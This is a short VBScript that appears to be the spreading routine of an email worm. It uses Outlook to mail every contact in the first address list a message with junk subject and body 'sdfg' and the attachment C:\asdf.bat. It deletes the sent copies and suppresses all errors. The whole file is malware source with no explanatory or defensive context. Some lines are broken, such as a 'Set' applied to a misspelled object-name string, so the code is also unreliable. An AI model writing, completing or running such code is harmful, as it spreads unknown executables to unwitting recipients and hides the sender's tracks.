Dim x 
on error resume next 
Set out= WScript.CreateObject("Outlook.Application") 
Set ol=CreateObject("Outlook.Application") 
Set fso ="Scripting.FileSystem.Object" 
Set so=CreateObject(fso) 
Set mapi = out.GetNameSpace("MAPI") 
Set a = mapi.AddressLists(1) 
Set ae=a.AddressEntries 
For x=1 To ae.Count 
Set ci=ol.CreateItem(0) 
Set Mail=ci 
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) 
Mail.Subject="sdfg" 
Mail.Body="sdfg" 
Mail.Attachments.Add("C:\asdf.bat") 
Mail.DeleteAfterSubmit = True
Mail.Send 
Next 
ol.Quit 

